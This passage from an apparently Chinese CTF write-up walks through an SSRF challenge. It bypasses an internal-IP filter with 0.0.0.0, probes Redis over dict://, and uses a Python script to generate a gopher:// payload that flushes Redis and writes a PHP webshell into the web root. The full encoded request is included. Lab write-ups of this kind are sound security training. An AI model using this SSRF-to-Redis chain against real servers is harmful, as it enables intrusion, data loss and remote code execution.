class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=preg_match(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=gethostbyname(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=ip2long(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (check_inner_ip(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = curl_getinfo(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            safe_request_url(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br>        var_dump(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;<br>        safe_request_url(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">// Please visit hint.php locally.</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>读取hint.php</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://cb<span class="hljs-number">0</span>f<span class="hljs-number">5</span>ef<span class="hljs-number">6</span>-<span class="hljs-number">1668</span>-<span class="hljs-number">4620</span>-a<span class="hljs-number">764</span>-<span class="hljs-number">3</span>af<span class="hljs-number">2</span>cac<span class="hljs-number">0</span>b<span class="hljs-number">19</span>b.node<span class="hljs-number">3</span>.buuoj.cn/?url=http://<span class="hljs-number">0.0.0.0</span>/hint.php<br></code></pre></td></tr></table></figure><p>hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>  highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>  file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><span class="hljs-string">&quot; </span><br></code></pre></td></tr></table></figure><p>利用<code>dict://</code>访问6379端口，存在redis，前面给出了密码为root</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://cb<span class="hljs-number">0</span>f<span class="hljs-number">5</span>ef<span class="hljs-number">6</span>-<span class="hljs-number">1668</span>-<span class="hljs-number">4620</span>-a<span class="hljs-number">764</span>-<span class="hljs-number">3</span>af<span class="hljs-number">2</span>cac<span class="hljs-number">0</span>b<span class="hljs-number">19</span>b.node<span class="hljs-number">3</span>.buuoj.cn/?url=dict://<span class="hljs-number">0.0.0.0:6379</span><br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/6086b21e53d31.jpg"></p><p>利用gopher协议，生成payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">C:\Users\dell\Desktop<br>&gt; python<span class="hljs-number">2</span> G:\工具\ssrf工具\gopherwriteshell<span class="hljs-number">2</span>.py<br><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%2</span>A<span class="hljs-number">2</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%244</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>AAUTH<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%244</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aroot<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-number">1</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%248</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aflushall<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%243</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aset<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%241</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2432</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>cat<span class="hljs-variable">%20</span>/flag<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-number">4</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%246</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aconfig<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%243</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aset<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%243</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Adir<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2413</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A/var/www/html<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-number">4</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%246</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aconfig<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%243</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aset<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2410</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Adbfilename<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%249</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Ashell.php<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-number">1</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%244</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Asave<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<br></code></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span><br>ip=<span class="hljs-string">&quot;10.0.231.11&quot;</span>      // 运行有redis的主机ip<br>port=<span class="hljs-string">&quot;6379&quot;</span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd=<span class="hljs-string">&quot;&quot;</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br> <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br> <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br> <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br> <span class="hljs-string">&quot;save&quot;</span><br> ]<br><span class="hljs-keyword">if</span> passwd:<br>cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>cmd=<span class="hljs-string">&quot;&quot;</span><br>cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>cmd+=CRLF<br><span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>payload += urllib.quote(redis_format(x))<br><span class="hljs-built_in">print</span> payload<br><br></code></pre></td></tr></table></figure><p>利用gopher协议，生成payload</p><p>把生成的payload进行url编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://cb<span class="hljs-number">0</span>f<span class="hljs-number">5</span>ef<span class="hljs-number">6</span>-<span class="hljs-number">1668</span>-<span class="hljs-number">4620</span>-a<span class="hljs-number">764</span>-<span class="hljs-number">3</span>af<span class="hljs-number">2</span>cac<span class="hljs-number">0</span>b<span class="hljs-number">19</span>b.node<span class="hljs-number">3</span>.buuoj.cn/?url=gopher://<span class="hljs-number">0.0.0.0:6379</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">55</span>%<span class="hljs-number">54</span>%<span class="hljs-number">48</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>c%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">43</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">46</span>%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">70</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">42</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">46</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">45</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">72</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">77</span>%<span class="hljs-number">77</span>%<span class="hljs-number">77</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">6</span>c%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">64</span>%<span class="hljs-number">62</span>%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>c%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">70</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">73</span>%<span class="hljs-number">61</span>%<span class="hljs-number">76</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><p>写入成功，得到flag</p><p><img src="https://www.hualigs.cn/image/6086b21e63d5c.jpg"></p><h1 id="主从复制rce"><a href="#主从复制rce" class="headerlink" 